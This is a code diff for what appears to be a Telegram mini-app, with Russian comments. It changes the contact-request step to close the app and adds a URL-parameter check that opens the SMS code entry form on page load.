@@ -428,15 +428,10 @@
                     action: 'request_contact'
                 }));
                 
-                // Показываем уведомление
-                if (tg.showAlert) {
-                    tg.showAlert('Поделитесь контактом в чате с ботом');
+                // Закрываем мини-приложение, чтобы пользователь мог поделиться контактом в чате
+                if (tg.close) {
+                    tg.close();
                 }
-                
-                // Переходим к следующему шагу через 3 секунды
-                setTimeout(() => {
-                    showCodeInput();
-                }, 3000);
                 
             } else {
                 console.log('⚠️ Демо режим - симуляция запроса контакта');
@@ -614,8 +609,24 @@
             }
         }
         
-        // Обработка ввода в поле кода
+        // Проверяем URL параметры при загрузке
+        function checkUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const step = urlParams.get('step');
+            
+            console.log('🔍 Проверяем URL параметры, step:', step);
+            
+            if (step === 'code') {
+                // Сразу показываем форму ввода кода
+                showCodeInput();
+            }
+        }
+        
+        // Вызываем при загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
+            console.log('📄 DOM загружен');
+            checkUrlParams();
+            
             const smsInput = document.getElementById('sms-code');
             if (smsInput) {
                 smsInput.addEventListener('input', function(e) {
